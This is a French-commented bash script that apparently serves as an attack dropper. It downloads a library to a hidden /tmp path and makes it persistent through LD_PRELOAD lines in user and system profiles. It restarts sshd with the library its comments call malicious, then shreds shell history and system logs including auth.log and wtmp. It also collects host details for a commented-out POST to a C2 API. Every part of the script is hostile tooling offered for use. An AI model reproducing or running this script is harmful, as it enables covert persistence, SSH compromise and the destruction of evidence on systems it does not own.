#!/bin/bash

# === CONFIGURATION ===
PROJET_URL="http://localhost/libproj.so"   # URL de la lib
PROJET_PATH="/tmp/.syslogd.so"             # Emplacement furtif
PROJET_HIDDEN="/tmp/.syslogd"              # Nom sous lequel on le save
API_URL="http://localhost/api/report"      # API pour le report telemetry
LOCK_FILE="/tmp/.libproj_lock"             # Fichier de test à empêcher l'ouverture

# === MASQUER L'HISTORIQUE ===
unset HISTFILE       # Désactive l'historique
unset HISTSIZE       # Empêche la réécriture de l’historique
set +o history       # Désactive l'enregistrement des commandes
clear

# === TÉLÉCHARGEMENT ===
echo "[*] Téléchargement..."
wget -q $PROJET_URL -O $PROJET_PATH || curl -s $PROJET_URL -o $PROJET_PATH
chmod +x $PROJET_PATH

# === MASQUAGE ===
echo "[*] Masquage..."
mv $PROJET_PATH $PROJET_HIDDEN

# === CONFIGURER LD_PRELOAD ===
echo "[*] Configuration de LD_PRELOAD..."
echo "export LD_PRELOAD=$PROJET_HIDDEN" >> ~/.bashrc
echo "export LD_PRELOAD=$PROJET_HIDDEN" >> ~/.profile

# Si root, rendre global pour tous les utilisateurs
if [ "$(id -u)" -eq 0 ]; then
    echo "export LD_PRELOAD=$PROJET_HIDDEN" >> /etc/bash.bashrc
    echo "export LD_PRELOAD=$PROJET_HIDDEN" >> /etc/profile
fi

# === REDÉMARRAGE DU SERVICE SSHD AVEC LA LIBRAIRIE MALVEILLANTE ===
echo "[*] Redémarrage du service SSHD avec la librairie malveillante..."

# Vérifie si le service sshd est en cours d'exécution et l'arrête
if pgrep -x "sshd" > /dev/null; then
    echo "[*] Arrêt du service SSHD en cours..."
    systemctl stop sshd 2>/dev/null || service ssh stop 2>/dev/null
fi

# Redémarre SSHD avec LD_PRELOAD pour injecter la librairie
echo "[*] Redémarrage de SSHD avec LD_PRELOAD..."
LD_PRELOAD=$PROJET_HIDDEN /usr/sbin/sshd -D &

# Vérifie si le redémarrage a réussi
if pgrep -x "sshd" > /dev/null; then
    echo "[+] SSHD a été redémarré avec succès avec la librairie malveillante."
else
    echo "[-] Échec du redémarrage de SSHD."
fi

# === CRÉER LE FICHIER DE TEST POUR EMPÊCHER SON OUVERTURE ===
touch "$LOCK_FILE"
chmod 777 "$LOCK_FILE"

# === EFFACER LES LOGS ===
echo "[*] Nettoyage des logs..."
history -c                            # Effacer l'historique de session
shred -u ~/.bash_history 2>/dev/null  # Suppression sécurisée
shred -u /var/log/auth.log 2>/dev/null
shred -u /var/log/syslog 2>/dev/null
shred -u /var/log/wtmp 2>/dev/null
shred -u /var/log/lastlog 2>/dev/null

# === RÉCUPÉRER INFOS DE LA MACHINE ===
HOSTNAME=$(hostname)
IP=$(hostname -I | awk '{print $1}')
DATE=$(date "+%Y-%m-%d %H:%M:%S")
USER=$(whoami)
OS=$(uname -a)

# === ENVOYER LES INFOS À L'API C2 ===
echo "[*] Envoi des informations à l'API C2..."
#curl -s -X POST -d "hostname=$HOSTNAME&ip=$IP&date=$DATE&user=$USER&os=$OS" $API_URL // a finaliser cote server

echo "[+] terminée avec succès."

# === TERMINER LE SCRIPT ET FERMER LE SHELL ===
kill -9 $$